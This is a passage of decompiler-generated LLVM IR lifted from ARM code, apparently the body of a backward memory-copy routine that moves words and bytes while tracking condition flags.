  store i8* %v5_1561c, i8** %stack_var_-8, align 4
  %v8_1561c = load i32, i32* @lr, align 4
  %v2_15620 = add i32 %v0_15614, -28
  store i32 %v2_15620, i32* %r2.global-to-local, align 4
  %v4_15620 = sub i32 27, %v0_15614
  %v5_15620 = and i32 %v4_15620, %v2_15614
  %v6_15620 = icmp slt i32 %v5_15620, 0
  store i1 %v6_15620, i1* %cpsr_v.global-to-local, align 1
  %v7_15620 = icmp slt i32 %v2_15620, 0
  store i1 %v7_15620, i1* %cpsr_n.global-to-local, align 1
  %v8_15620 = icmp eq i32 %v2_15614, 20
  store i1 %v8_15620, i1* %cpsr_z.global-to-local, align 1
  %v5_15624 = icmp slt i32 %v2_15614, 20
  br i1 %v5_15624, label %dec_label_pc_15640, label %dec_label_pc_15628

dec_label_pc_15628:                               ; preds = %dec_label_pc_1561c, %dec_label_pc_15628.dec_label_pc_15628_crit_edge
  %v0_1562c = phi i32 [ %v1_15634, %dec_label_pc_15628.dec_label_pc_15628_crit_edge ], [ %v0_1562c37, %dec_label_pc_1561c ]
  %v0_15628 = phi i32 [ %v0_15628.pre, %dec_label_pc_15628.dec_label_pc_15628_crit_edge ], [ %v0_1562836, %dec_label_pc_1561c ]
  %v1_15628 = add i32 %v0_15628, -4
  %v2_15628 = inttoptr i32 %v1_15628 to i32*
  %v3_15628 = load i32, i32* %v2_15628, align 4
  %v4_15628 = add i32 %v0_15628, -8
  %v5_15628 = inttoptr i32 %v4_15628 to i32*
  %v6_15628 = load i32, i32* %v5_15628, align 4
  store i32 %v6_15628, i32* %r4.global-to-local, align 4
  %v7_15628 = add i32 %v0_15628, -12
  %v8_15628 = inttoptr i32 %v7_15628 to i32*
  %v9_15628 = load i32, i32* %v8_15628, align 4
  store i32 %v9_15628, i32* %ip.global-to-local, align 4
  %v10_15628 = add i32 %v0_15628, -16
  %v11_15628 = inttoptr i32 %v10_15628 to i32*
  %v12_15628 = load i32, i32* %v11_15628, align 4
  store i32 %v12_15628, i32* %lr.global-to-local, align 4
  store i32 %v10_15628, i32* %r1.global-to-local, align 4
  %v1_1562c = add i32 %v0_1562c, -16
  %v2_1562c = inttoptr i32 %v1_1562c to i32*
  store i32 %v3_15628, i32* %v2_1562c, align 4
  %v4_1562c = add i32 %v0_1562c, -12
  %v5_1562c = inttoptr i32 %v4_1562c to i32*
  %v6_1562c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1562c, i32* %v5_1562c, align 4
  %v7_1562c = add i32 %v0_1562c, -8
  %v8_1562c = inttoptr i32 %v7_1562c to i32*
  %v9_1562c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_1562c, i32* %v8_1562c, align 4
  %v10_1562c = add i32 %v0_1562c, -4
  %v11_1562c = inttoptr i32 %v10_1562c to i32*
  %v12_1562c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1562c, i32* %v11_1562c, align 4
  store i32 %v1_1562c, i32* %r0.global-to-local, align 4
  %v0_15630 = load i32, i32* %r1.global-to-local, align 4
  %v1_15630 = add i32 %v0_15630, -4
  %v2_15630 = inttoptr i32 %v1_15630 to i32*
  %v3_15630 = load i32, i32* %v2_15630, align 4
  store i32 %v3_15630, i32* @r3, align 4
  %v4_15630 = add i32 %v0_15630, -8
  %v5_15630 = inttoptr i32 %v4_15630 to i32*
  %v6_15630 = load i32, i32* %v5_15630, align 4
  store i32 %v6_15630, i32* %r4.global-to-local, align 4
  %v7_15630 = add i32 %v0_15630, -12
  %v8_15630 = inttoptr i32 %v7_15630 to i32*
  %v9_15630 = load i32, i32* %v8_15630, align 4
  store i32 %v9_15630, i32* @ip, align 4
  %v10_15630 = add i32 %v0_15630, -16
  %v11_15630 = inttoptr i32 %v10_15630 to i32*
  %v12_15630 = load i32, i32* %v11_15630, align 4
  store i32 %v12_15630, i32* %lr.global-to-local, align 4
  store i32 %v10_15630, i32* %r1.global-to-local, align 4
  %v1_15634 = add i32 %v0_1562c, -32
  %v2_15634 = inttoptr i32 %v1_15634 to i32*
  store i32 %v3_15630, i32* %v2_15634, align 4
  %v4_15634 = add i32 %v0_1562c, -28
  %v5_15634 = inttoptr i32 %v4_15634 to i32*
  %v6_15634 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_15634, i32* %v5_15634, align 4
  %v7_15634 = add i32 %v0_1562c, -24
  %v8_15634 = inttoptr i32 %v7_15634 to i32*
  %v9_15634 = load i32, i32* @ip, align 4
  store i32 %v9_15634, i32* %v8_15634, align 4
  %v10_15634 = add i32 %v0_1562c, -20
  %v11_15634 = inttoptr i32 %v10_15634 to i32*
  %v12_15634 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15634, i32* %v11_15634, align 4
  store i32 %v1_15634, i32* %r0.global-to-local, align 4
  %v0_15638 = load i32, i32* %r2.global-to-local, align 4
  %v2_15638 = add i32 %v0_15638, -32
  store i32 %v2_15638, i32* %r2.global-to-local, align 4
  %v6_1563c = icmp slt i32 %v0_15638, 32
  br i1 %v6_1563c, label %dec_label_pc_15640.loopexit, label %dec_label_pc_15628.dec_label_pc_15628_crit_edge

dec_label_pc_15628.dec_label_pc_15628_crit_edge:  ; preds = %dec_label_pc_15628
  %v0_15628.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15628

dec_label_pc_15640.loopexit:                      ; preds = %dec_label_pc_15628
  %v4_15638 = sub i32 31, %v0_15638
  %v5_15638 = and i32 %v4_15638, %v0_15638
  %v6_15638 = icmp slt i32 %v5_15638, 0
  %v7_15638 = icmp slt i32 %v2_15638, 0
  store i1 %v6_15638, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15638, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15640

dec_label_pc_15640:                               ; preds = %dec_label_pc_15640.loopexit, %dec_label_pc_1561c
  %v6_15648 = phi i32 [ %v1_15634, %dec_label_pc_15640.loopexit ], [ %v0_1562c37, %dec_label_pc_1561c ]
  %v0_15650.pr = phi i32 [ %v2_15638, %dec_label_pc_15640.loopexit ], [ %v2_15620, %dec_label_pc_1561c ]
  %v4_15640 = add i32 %v0_15650.pr, 16
  %v6_15640 = sub i32 0, %v0_15650.pr
  %v7_15640 = and i32 %v4_15640, %v6_15640
  %v8_15640 = icmp slt i32 %v7_15640, 0
  store i1 %v8_15640, i1* %cpsr_v.global-to-local, align 1
  %v9_15640 = icmp slt i32 %v4_15640, 0
  store i1 %v9_15640, i1* %cpsr_n.global-to-local, align 1
  %v10_15640 = icmp eq i32 %v4_15640, 0
  store i1 %v10_15640, i1* %cpsr_z.global-to-local, align 1
  %v5_15644 = icmp slt i32 %v0_15650.pr, -16
  br i1 %v5_15644, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_15640
  %v6_15644 = load i32, i32* %r1.global-to-local, align 4
  %v7_15644 = add i32 %v6_15644, -4
  %v8_15644 = inttoptr i32 %v7_15644 to i32*
  %v9_15644 = load i32, i32* %v8_15644, align 4
  store i32 %v9_15644, i32* @r3, align 4
  %v10_15644 = add i32 %v6_15644, -8
  %v11_15644 = inttoptr i32 %v10_15644 to i32*
  %v12_15644 = load i32, i32* %v11_15644, align 4
  store i32 %v12_15644, i32* %r4.global-to-local, align 4
  %v13_15644 = add i32 %v6_15644, -12
  %v14_15644 = inttoptr i32 %v13_15644 to i32*
  %v15_15644 = load i32, i32* %v14_15644, align 4
  store i32 %v15_15644, i32* @ip, align 4
  %v16_15644 = add i32 %v6_15644, -16
  %v17_15644 = inttoptr i32 %v16_15644 to i32*
  %v18_15644 = load i32, i32* %v17_15644, align 4
  store i32 %v18_15644, i32* %lr.global-to-local, align 4
  store i32 %v16_15644, i32* %r1.global-to-local, align 4
  %v7_15648 = add i32 %v6_15648, -16
  %v8_15648 = inttoptr i32 %v7_15648 to i32*
  store i32 %v9_15644, i32* %v8_15648, align 4
  %v10_15648 = add i32 %v6_15648, -12
  %v11_15648 = inttoptr i32 %v10_15648 to i32*
  %v12_15648 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_15648, i32* %v11_15648, align 4
  %v13_15648 = add i32 %v6_15648, -8
  %v14_15648 = inttoptr i32 %v13_15648 to i32*
  %v15_15648 = load i32, i32* @ip, align 4
  store i32 %v15_15648, i32* %v14_15648, align 4
  %v16_15648 = add i32 %v6_15648, -4
  %v17_15648 = inttoptr i32 %v16_15648 to i32*
  %v18_15648 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_15648, i32* %v17_15648, align 4
  store i32 %v7_15648, i32* %r0.global-to-local, align 4
  %v6_1564c = load i32, i32* %r2.global-to-local, align 4
  %v7_1564c = add i32 %v6_1564c, -16
  store i32 %v7_1564c, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15640, %bb147
  %v6_15658 = phi i32 [ %v7_15648, %bb147 ], [ %v6_15648, %dec_label_pc_15640 ]
  %v0_15650 = phi i32 [ %v7_1564c, %bb147 ], [ %v0_15650.pr, %dec_label_pc_15640 ]
  %v4_15650 = add i32 %v0_15650, 20
  store i32 %v4_15650, i32* %r2.global-to-local, align 4
  %v6_15650 = sub i32 0, %v0_15650
  %v7_15650 = and i32 %v4_15650, %v6_15650
  %v8_15650 = icmp slt i32 %v7_15650, 0
  store i1 %v8_15650, i1* %cpsr_v.global-to-local, align 1
  %v9_15650 = icmp slt i32 %v4_15650, 0
  store i1 %v9_15650, i1* %cpsr_n.global-to-local, align 1
  %v10_15650 = icmp eq i32 %v4_15650, 0
  store i1 %v10_15650, i1* %cpsr_z.global-to-local, align 1
  %v5_15654 = icmp slt i32 %v0_15650, -20
  br i1 %v5_15654, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_15654 = load i32, i32* %r1.global-to-local, align 4
  %v7_15654 = add i32 %v6_15654, -4
  %v8_15654 = inttoptr i32 %v7_15654 to i32*
  %v9_15654 = load i32, i32* %v8_15654, align 4
  store i32 %v9_15654, i32* @r3, align 4
  %v10_15654 = add i32 %v6_15654, -8
  %v11_15654 = inttoptr i32 %v10_15654 to i32*
  %v12_15654 = load i32, i32* %v11_15654, align 4
  store i32 %v12_15654, i32* @ip, align 4
  %v13_15654 = add i32 %v6_15654, -12
  %v14_15654 = inttoptr i32 %v13_15654 to i32*
  %v15_15654 = load i32, i32* %v14_15654, align 4
  store i32 %v15_15654, i32* %lr.global-to-local, align 4
  store i32 %v13_15654, i32* %r1.global-to-local, align 4
  %v7_15658 = add i32 %v6_15658, -12
  %v8_15658 = inttoptr i32 %v7_15658 to i32*
  store i32 %v9_15654, i32* %v8_15658, align 4
  %v10_15658 = add i32 %v6_15658, -8
  %v11_15658 = inttoptr i32 %v10_15658 to i32*
  %v12_15658 = load i32, i32* @ip, align 4
  store i32 %v12_15658, i32* %v11_15658, align 4
  %v13_15658 = add i32 %v6_15658, -4
  %v14_15658 = inttoptr i32 %v13_15658 to i32*
  %v15_15658 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_15658, i32* %v14_15658, align 4
  store i32 %v7_15658, i32* %r0.global-to-local, align 4
  %v6_1565c = load i32, i32* %r2.global-to-local, align 4
  %v7_1565c = add i32 %v6_1565c, -12
  store i32 %v7_1565c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_1567c45 = phi i32 [ %v6_15658, %.thread2 ], [ %v7_15658, %bb148 ]
  %v0_1566443 = phi i32 [ %v4_15650, %.thread2 ], [ %v7_1565c, %bb148 ]
  %v2_15660 = load i8*, i8** %stack_var_-8, align 4
  %v3_15660 = ptrtoint i8* %v2_15660 to i32
  store i32 %v3_15660, i32* @r4, align 4
  store i32 %v8_1561c, i32* @lr, align 4
  br label %dec_label_pc_15664

dec_label_pc_15664:                               ; preds = %dec_label_pc_15614, %.thread4
  %v7_15674 = phi i32 [ %v0_1562c37, %dec_label_pc_15614 ], [ %v6_1567c45, %.thread4 ]
  %v0_15664 = phi i32 [ %v2_15614, %dec_label_pc_15614 ], [ %v0_1566443, %.thread4 ]
  %v2_15664 = add i32 %v0_15664, 8
  store i32 %v2_15664, i32* %r2.global-to-local, align 4
  %v4_15664 = sub i32 0, %v0_15664
  %v5_15664 = and i32 %v2_15664, %v4_15664
  %v6_15664 = icmp slt i32 %v5_15664, 0
  store i1 %v6_15664, i1* %cpsr_v.global-to-local, align 1
  %v7_15664 = icmp slt i32 %v2_15664, 0
  store i1 %v7_15664, i1* %cpsr_n.global-to-local, align 1
  %v8_15664 = icmp eq i32 %v2_15664, 0
  store i1 %v8_15664, i1* %cpsr_z.global-to-local, align 1
  %v5_15668 = icmp slt i32 %v0_15664, -8
  br i1 %v5_15668, label %bb150, label %dec_label_pc_1566c

dec_label_pc_1566c:                               ; preds = %dec_label_pc_15664
  %v6_1566c = add i32 %v0_15664, 4
  store i32 %v6_1566c, i32* %r2.global-to-local, align 4
  %v8_1566c = sub i32 -5, %v0_15664
  %v9_1566c = and i32 %v8_1566c, %v2_15664
  %v10_1566c = icmp slt i32 %v9_1566c, 0
  store i1 %v10_1566c, i1* %cpsr_v.global-to-local, align 1
  %v11_1566c = icmp slt i32 %v6_1566c, 0
  store i1 %v11_1566c, i1* %cpsr_n.global-to-local, align 1
  %v12_1566c = icmp eq i32 %v2_15664, 4
  store i1 %v12_1566c, i1* %cpsr_z.global-to-local, align 1
  %v5_15670 = icmp slt i32 %v2_15664, 4
  %v6_15670 = load i32, i32* %r1.global-to-local, align 4
  %v7_15670 = add i32 %v6_15670, -4
  %v8_15670 = inttoptr i32 %v7_15670 to i32*
  %v9_15670 = load i32, i32* %v8_15670, align 4
  store i32 %v9_15670, i32* @r3, align 4
  br i1 %v5_15670, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_1566c
  store i32 %v7_15670, i32* %r1.global-to-local, align 4
  %v8_15674 = add i32 %v7_15674, -4
  %v9_15674 = inttoptr i32 %v8_15674 to i32*
  store i32 %v9_15670, i32* %v9_15674, align 4
  %v10_15674 = load i32, i32* %r0.global-to-local, align 4
  %v11_15674 = add i32 %v10_15674, -4
  store i32 %v11_15674, i32* %r0.global-to-local, align 4
  %v0_15684.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_1566c
  %v10_15678 = add i32 %v6_15670, -8
  %v11_15678 = inttoptr i32 %v10_15678 to i32*
  %v12_15678 = load i32, i32* %v11_15678, align 4
  store i32 %v12_15678, i32* @ip, align 4
  store i32 %v10_15678, i32* %r1.global-to-local, align 4
  %v7_1567c = add i32 %v7_15674, -8
  %v8_1567c = inttoptr i32 %v7_1567c to i32*
  store i32 %v9_15670, i32* %v8_1567c, align 4
  %v10_1567c = add i32 %v7_15674, -4
  %v11_1567c = inttoptr i32 %v10_1567c to i32*
  %v12_1567c = load i32, i32* @ip, align 4
  store i32 %v12_1567c, i32* %v11_1567c, align 4
  store i32 %v7_1567c, i32* %r0.global-to-local, align 4
  %v6_15680 = load i32, i32* %r2.global-to-local, align 4
  %v7_15680 = add i32 %v6_15680, -4
  store i32 %v7_15680, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %dec_label_pc_15664, %dec_label_pc_155f4, %.thread14, %dec_label_pc_15828, %dec_label_pc_157bc, %dec_label_pc_15750, %bb149
  %v2_15688 = phi i32 [ %v11_15674, %.thread8 ], [ %v7_15674, %dec_label_pc_15664 ], [ %v2_155f8, %dec_label_pc_155f4 ], [ %v0_1572020, %.thread14 ], [ %v2_1569453, %dec_label_pc_15828 ], [ %v2_1569452, %dec_label_pc_157bc ], [ %v2_1569451, %dec_label_pc_15750 ], [ %v7_1567c, %bb149 ]
  %v0_15684 = phi i32 [ %v0_15684.pre, %.thread8 ], [ %v2_15664, %dec_label_pc_15664 ], [ %v2_155fc, %dec_label_pc_155f4 ], [ %v2_156c8, %.thread14 ], [ %v0_1568449, %dec_label_pc_15828 ], [ %v0_1568448, %dec_label_pc_157bc ], [ %v0_1568447, %dec_label_pc_15750 ], [ %v7_15680, %bb149 ]
  %v1_15684 = add i32 %v0_15684, 4
  store i32 %v1_15684, i32* %r2.global-to-local, align 4
  %v3_15684 = sub i32 0, %v0_15684
  %v4_15684 = and i32 %v1_15684, %v3_15684
  %v5_15684 = icmp slt i32 %v4_15684, 0
  store i1 %v5_15684, i1* %cpsr_v.global-to-local, align 1
  %v6_15684 = icmp slt i32 %v1_15684, 0
  store i1 %v6_15684, i1* %cpsr_n.global-to-local, align 1
  %v7_15684 = icmp eq i32 %v1_15684, 0
  store i1 %v7_15684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15684, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_1568c = add i32 %v0_15684, 2
  %v3_1568c = sub i32 -3, %v0_15684
  %v4_1568c = and i32 %v3_1568c, %v1_15684
  %v5_1568c = icmp slt i32 %v4_1568c, 0
  store i1 %v5_1568c, i1* %cpsr_v.global-to-local, align 1
  %v6_1568c = icmp slt i32 %v1_1568c, 0
  store i1 %v6_1568c, i1* %cpsr_n.global-to-local, align 1
  %v7_1568c = icmp eq i32 %v1_15684, 2
  store i1 %v7_1568c, i1* %cpsr_z.global-to-local, align 1
  %v0_15690 = load i32, i32* %r1.global-to-local, align 4
  %v1_15690 = add i32 %v0_15690, -1
  %v2_15690 = inttoptr i32 %v1_15690 to i8*
  %v3_15690 = load i8, i8* %v2_15690, align 1
  %v4_15690 = zext i8 %v3_15690 to i32
  store i32 %v4_15690, i32* @r3, align 4
  store i32 %v1_15690, i32* %r1.global-to-local, align 4
  %v3_15694 = add i32 %v2_15688, -1
  %v4_15694 = inttoptr i32 %v3_15694 to i8*
  store i8 %v3_15690, i8* %v4_15694, align 1
  %v5_15694 = load i32, i32* %r0.global-to-local, align 4
  %v6_15694 = add i32 %v5_15694, -1
  store i32 %v6_15694, i32* %r0.global-to-local, align 4
  %v0_15698 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_15698 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_15698 = xor i1 %v0_15698, %v1_15698
  br i1 %v2_15698, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_15698 = load i32, i32* %r1.global-to-local, align 4
  %v4_15698 = add i32 %v3_15698, -1
  %v5_15698 = inttoptr i32 %v4_15698 to i8*
  %v6_15698 = load i8, i8* %v5_15698, align 1
  %v7_15698 = zext i8 %v6_15698 to i32
  store i32 %v7_15698, i32* @r3, align 4
  store i32 %v4_15698, i32* %r1.global-to-local, align 4
  %v6_1569c = add i32 %v5_15694, -2
  %v7_1569c = inttoptr i32 %v6_1569c to i8*
  store i8 %v6_15698, i8* %v7_1569c, align 1
  %v8_1569c = load i32, i32* %r0.global-to-local, align 4
  %v9_1569c = add i32 %v8_1569c, -1
  store i32 %v9_1569c, i32* %r0.global-to-local, align 4
  %v1_156a0.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_156a0.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_156a4 = phi i32 [ %v9_1569c, %bb152 ], [ %v6_15694, %bb151 ]
  %v2_156a4 = phi i1 [ %v2_156a0.pre, %bb152 ], [ %v1_15698, %bb151 ]
  %v1_156a4 = phi i1 [ %v1_156a0.pre, %bb152 ], [ %v0_15698, %bb151 ]
  %v0_156a0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_156a0 = xor i1 %v2_156a4, %v1_156a4
  %v4_156a0 = or i1 %v0_156a0, %v3_156a0
  br i1 %v4_156a0, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_156a0 = load i32, i32* %r1.global-to-local, align 4
  %v6_156a0 = add i32 %v5_156a0, -1
  %v7_156a0 = inttoptr i32 %v6_156a0 to i8*
  %v8_156a0 = load i8, i8* %v7_156a0, align 1
  %v9_156a0 = zext i8 %v8_156a0 to i32
  store i32 %v9_156a0, i32* @r3, align 4
  store i32 %v6_156a0, i32* %r1.global-to-local, align 4
  %v8_156a4 = add i32 %v7_156a4, -1
  %v9_156a4 = inttoptr i32 %v8_156a4 to i8*
  store i8 %v8_156a0, i8* %v9_156a4, align 1
  %v10_156a4 = load i32, i32* %r0.global-to-local, align 4
  %v11_156a4 = add i32 %v10_156a4, -1
  store i32 %v11_156a4, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_156ac:                               ; preds = %dec_label_pc_15604
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_156ac = icmp eq i32 %v1_15604, 1
  store i1 %v8_156ac, i1* %cpsr_n.global-to-local, align 1
  %v9_156ac = icmp eq i32 %v1_15604, 2
  store i1 %v9_156ac, i1* %cpsr_z.global-to-local, align 1
  %v1_156b0 = add i32 %v2_155f4, -1
  %v2_156b0 = inttoptr i32 %v1_156b0 to i8*
  %v3_156b0 = load i8, i8* %v2_156b0, align 1
  %v4_156b0 = zext i8 %v3_156b0 to i32
  store i32 %v4_156b0, i32* @r3, align 4
  store i32 %v1_156b0, i32* %r1.global-to-local, align 4
  %v3_156b4 = add i32 %v2_155f8, -1
  %v4_156b4 = inttoptr i32 %v3_156b4 to i8*
  store i8 %v3_156b0, i8* %v4_156b4, align 1
  %v5_156b4 = load i32, i32* %r0.global-to-local, align 4
  %v6_156b4 = add i32 %v5_156b4, -1
  store i32 %v6_156b4, i32* %r0.global-to-local, align 4
  br i1 %v8_156ac, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_156ac
  %v6_156b8 = load i32, i32* %r1.global-to-local, align 4
  %v7_156b8 = add i32 %v6_156b8, -1
  %v8_156b8 = inttoptr i32 %v7_156b8 to i8*
  %v9_156b8 = load i8, i8* %v8_156b8, align 1
  %v10_156b8 = zext i8 %v9_156b8 to i32
  store i32 %v10_156b8, i32* @r3, align 4
  store i32 %v7_156b8, i32* %r1.global-to-local, align 4
  %v9_156bc = add i32 %v5_156b4, -2
  %v10_156bc = inttoptr i32 %v9_156bc to i8*
  store i8 %v9_156b8, i8* %v10_156bc, align 1
  %v11_156bc = load i32, i32* %r0.global-to-local, align 4
  %v12_156bc = add i32 %v11_156bc, -1
  store i32 %v12_156bc, i32* %r0.global-to-local, align 4
  br i1 %v9_156ac, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_156c0 = load i32, i32* %r1.global-to-local, align 4
  %v9_156c0 = add i32 %v8_156c0, -1
  %v10_156c0 = inttoptr i32 %v9_156c0 to i8*
  %v11_156c0 = load i8, i8* %v10_156c0, align 1
  %v12_156c0 = zext i8 %v11_156c0 to i32
  store i32 %v12_156c0, i32* @r3, align 4
  store i32 %v9_156c0, i32* %r1.global-to-local, align 4
  %v11_156c4 = add i32 %v11_156bc, -2
  %v12_156c4 = inttoptr i32 %v11_156c4 to i8*
  store i8 %v11_156c0, i8* %v12_156c4, align 1
  %v13_156c4 = load i32, i32* %r0.global-to-local, align 4
  %v14_156c4 = add i32 %v13_156c4, -1
  store i32 %v14_156c4, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_156ac, %bb155
  %v0_1572020 = phi i32 [ %v12_156bc, %bb154 ], [ %v6_156b4, %dec_label_pc_156ac ], [ %v14_156c4, %bb155 ]
  %v0_156c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_156c8 = load i32, i32* @ip, align 4
  %v2_156c8 = sub i32 %v0_156c8, %v1_156c8
  store i32 %v2_156c8, i32* %r2.global-to-local, align 4
  %v4_156c8 = xor i32 %v1_156c8, %v0_156c8
  %v5_156c8 = xor i32 %v2_156c8, %v0_156c8
  %v6_156c8 = and i32 %v5_156c8, %v4_156c8
  %v7_156c8 = icmp slt i32 %v6_156c8, 0
  store i1 %v7_156c8, i1* %cpsr_v.global-to-local, align 1
  %v8_156c8 = icmp slt i32 %v2_156c8, 0
  store i1 %v8_156c8, i1* %cpsr_n.global-to-local, align 1
  %v9_156c8 = icmp eq i32 %v0_156c8, %v1_156c8
  store i1 %v9_156c8, i1* %cpsr_z.global-to-local, align 1
  %v5_156cc = icmp slt i32 %v0_156c8, %v1_156c8
  br i1 %v5_156cc, label %bb150, label %dec_label_pc_156d0

dec_label_pc_156d0:                               ; preds = %.thread14
  %v0_156d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_156d0 = urem i32 %v0_156d0, 4
  store i32 %v1_156d0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_156d0 = icmp eq i32 %v1_156d0, 0
  store i1 %v2_156d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_156d0, label %dec_label_pc_15614, label %dec_label_pc_156d8

dec_label_pc_156d8:                               ; preds = %dec_label_pc_1560c, %dec_label_pc_156d0
  %v0_1572019 = phi i32 [ %v2_155f8, %dec_label_pc_1560c ], [ %v0_1572020, %dec_label_pc_156d0 ]
  %v0_157cc = phi i32 [ %v2_155fc, %dec_label_pc_1560c ], [ %v2_156c8, %dec_label_pc_156d0 ]
  %v0_156d8 = phi i32 [ %v2_155f4, %dec_label_pc_1560c ], [ %v0_156d0, %dec_label_pc_156d0 ]
  %v0_156e0 = phi i32 [ %v1_1560c, %dec_label_pc_1560c ], [ %v1_156d0, %dec_label_pc_156d0 ]
  %v1_156d8 = and i32 %v0_156d8, -4
  store i32 %v1_156d8, i32* %r1.global-to-local, align 4
  %v1_156dc = inttoptr i32 %v1_156d8 to i32*
  %v2_156dc = load i32, i32* %v1_156dc, align 4
  store i32 %v2_156dc, i32* @r3, align 4
  %v7_156e0 = icmp ult i32 %v0_156e0, 2
  %v2_157c4 = add i32 %v0_157cc, -12
  %v4_157c4 = sub i32 11, %v0_157cc
  %v5_157c4 = and i32 %v4_157c4, %v0_157cc
  %v6_157c4 = icmp slt i32 %v5_157c4, 0
  store i1 %v6_157c4, i1* %cpsr_v.global-to-local, align 1
  %v7_157c4 = icmp slt i32 %v2_157c4, 0
  store i1 %v7_157c4, i1* %cpsr_n.global-to-local, align 1
  %v8_157c4 = icmp eq i32 %v0_157cc, 12
  store i1 %v8_157c4, i1* %cpsr_z.global-to-local, align 1
  %v5_157c8 = icmp slt i32 %v0_157cc, 12
  br i1 %v7_156e0, label %dec_label_pc_157c4, label %dec_label_pc_156e8

dec_label_pc_156e8:                               ; preds = %dec_label_pc_156d8
  %v8_156e0 = icmp eq i32 %v0_156e0, 2
  br i1 %v8_156e0, label %dec_label_pc_15758, label %dec_label_pc_156ec

dec_label_pc_156ec:                               ; preds = %dec_label_pc_156e8
  br i1 %v5_157c8, label %dec_label_pc_15738, label %dec_label_pc_156f4

dec_label_pc_156f4:                               ; preds = %dec_label_pc_156ec
  store i32 %v2_157c4, i32* %r2.global-to-local, align 4
  %v3_156f8 = load i32, i32* @r4, align 4
  store i32 %v3_156f8, i32* %stack_var_-12, align 4
  %v6_156f8 = load i32, i32* @r5, align 4
  %v8_156f8 = inttoptr i32 %v6_156f8 to i8*
  store i8* %v8_156f8, i8** %stack_var_-8, align 4
  %v11_156f8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_156fc

dec_label_pc_156fc:                               ; preds = %dec_label_pc_156fc.dec_label_pc_156fc_crit_edge, %dec_label_pc_156f4
  %v0_15720 = phi i32 [ %v1_15720, %dec_label_pc_156fc.dec_label_pc_156fc_crit_edge ], [ %v0_1572019, %dec_label_pc_156f4 ]
  %v0_15700 = phi i32 [ %v0_15700.pre, %dec_label_pc_156fc.dec_label_pc_156fc_crit_edge ], [ %v1_156d8, %dec_label_pc_156f4 ]
  %v0_156fc = phi i32 [ %v0_156fc.pre, %dec_label_pc_156fc.dec_label_pc_156fc_crit_edge ], [ %v2_156dc, %dec_label_pc_156f4 ]
  %v3_156fc = mul i32 %v0_156fc, 256
  store i32 %v3_156fc, i32* %lr.global-to-local, align 4
  %v1_15700 = add i32 %v0_15700, -4
  %v2_15700 = inttoptr i32 %v1_15700 to i32*
  %v3_15700 = load i32, i32* %v2_15700, align 4
  store i32 %v3_15700, i32* @r3, align 4
  %v4_15700 = add i32 %v0_15700, -8
  %v5_15700 = inttoptr i32 %v4_15700 to i32*
  %v6_15700 = load i32, i32* %v5_15700, align 4
  store i32 %v6_15700, i32* %r4.global-to-local, align 4
  %v7_15700 = add i32 %v0_15700, -12
  %v8_15700 = inttoptr i32 %v7_15700 to i32*
  %v9_15700 = load i32, i32* %v8_15700, align 4
  store i32 %v9_15700, i32* %r5.global-to-local, align 4
  %v10_15700 = add i32 %v0_15700, -16
  %v11_15700 = inttoptr i32 %v10_15700 to i32*
  %v12_15700 = load i32, i32* %v11_15700, align 4
  store i32 %v10_15700, i32* %r1.global-to-local, align 4
  %v4_15704 = udiv i32 %v12_15700, 16777216
  %v5_15704 = or i32 %v4_15704, %v3_156fc
  store i32 %v5_15704, i32* %lr.global-to-local, align 4
  %v3_15708 = mul i32 %v12_15700, 256
  %v4_1570c = udiv i32 %v9_15700, 16777216
  %v5_1570c = or i32 %v3_15708, %v4_1570c
  store i32 %v5_1570c, i32* @ip, align 4
  %v3_15710 = mul i32 %v9_15700, 256
  %v4_15714 = udiv i32 %v6_15700, 16777216
  %v5_15714 = or i32 %v3_15710, %v4_15714
  store i32 %v5_15714, i32* %r5.global-to-local, align 4
  %v3_15718 = mul i32 %v6_15700, 256
  %v4_1571c = udiv i32 %v3_15700, 16777216
  %v5_1571c = or i32 %v3_15718, %v4_1571c
  store i32 %v5_1571c, i32* %r4.global-to-local, align 4
  %v1_15720 = add i32 %v0_15720, -16
  %v2_15720 = inttoptr i32 %v1_15720 to i32*
  store i32 %v5_1571c, i32* %v2_15720, align 4
